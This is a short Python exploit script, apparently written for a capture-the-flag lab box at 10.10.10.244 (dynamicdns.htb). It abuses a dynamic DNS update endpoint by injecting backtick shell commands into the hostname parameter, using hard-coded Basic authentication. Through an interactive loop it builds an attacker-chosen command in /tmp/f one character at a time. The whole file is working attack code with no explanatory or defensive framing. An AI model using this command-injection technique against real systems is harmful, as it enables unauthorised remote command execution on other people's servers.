#!/usr/bin/env python3

from urllib import request 
import base64

proxy = {"http":"http://localhost:8080"}
url = "http://10.10.10.244/nic/update?myip=77.77.77.77&hostname="

headers = {"Authorization":"Basic ZHluYWRuczpzbmRhbnlk"}

while True:
    tmp = []
    usr = input("$:> ")
    for i in usr:
        tmp.append(i)
    first = tmp[0]
    first_cmd = f"`echo+-n+{first}>/tmp/f;echo+a`"
    req = request.Request(url + first_cmd + ".dynamicdns.htb", headers=headers)
    resp = request.urlopen(req).read().decode('utf-8')
    if resp != "good 77.77.77.77\n":
        print("Failed: %s" %resp)
        continue
    for x in range(1,len(tmp)):
        if tmp[x] == " ":
            tmp[x] = "' '"
        next_cmd = f"`echo+-n+{tmp[x]}>>/tmp/f;echo+a`"
        print(next_cmd)
        reqx = request.Request(url + next_cmd + ".dynamicdns.htb", headers=headers)
        reqx.set_proxy("localhost:8080", "http")
        respx = request.urlopen(reqx).read().decode('utf-8')
    print("\nDone")
